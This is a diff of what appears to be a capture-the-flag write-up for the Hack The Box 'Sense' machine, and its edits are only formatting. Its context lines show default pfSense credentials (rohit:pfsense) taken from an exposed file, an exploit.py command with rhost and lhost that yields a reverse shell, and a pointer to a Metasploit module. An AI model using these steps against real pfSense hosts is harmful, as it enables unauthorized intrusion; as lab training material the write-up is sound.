@@ -118,19 +118,22 @@ https://10.10.10.60/system-users.txt (Status: 200)
 
 As you can see now, we get 2 new options - **changelog.txt** and **system-users.txt**. Let's check them out.
 
-*changelog.txt*:
+File: *changelog.txt*:
 <img src="/assets/img/blog/htb-sense/htb-sense-03.png">
 
 Good news in this one! It mentions that 2 out of 3 vulnerabilities have been patched. That means that 1 vulnerability can still be exploited! Moving on...
 
-*system-users.txt*:
+File: *system-users.txt*:
 <img src="/assets/img/blog/htb-sense/htb-sense-04.png">
 ```
 username: Rohit
 password: company defaults
 ```
 Look at that. Wonderful! We successfully obtained rohit's credentials. Use them to login to *pfSense* - `rohit:pfsense`.
-> Note: Make sure you type *rohit* with all lowercase letters. pfSense has case sensitive login mechanism even for usernames.
+<div class="notice--info">
+  <h4>Note:</h4>
+  <p> Make sure you type *rohit* with all lowercase letters. pfSense has case sensitive login mechanism even for usernames.</p>
+</div>
 
 pfSense dashboard:   
 <img src="/assets/img/blog/htb-sense/htb-sense-05.png">
@@ -168,7 +171,10 @@ And therefore running `python3 exploit.py --rhost 10.10.10.60 --lhost 10.10.14.7
 
 <img src="/assets/img/blog/htb-sense/htb-sense-07.png">
 
-> Note: Make sure you use python3, not python2!
+<div class="notice--info">
+  <h4>Note:</h4>
+  <p> Make sure you use python3, not python2! </p>
+</div>
 
 ## Using Metasploit
 As it appears, there is also a metasploit module which simplifies everything we've done so far. The [exploit](https://www.rapid7.com/db/modules/exploit/unix/http/pfsense_graph_injection_exec) is very simple and all that's required is setting up the LHOST, RHOST and rohit username. You know the drill.
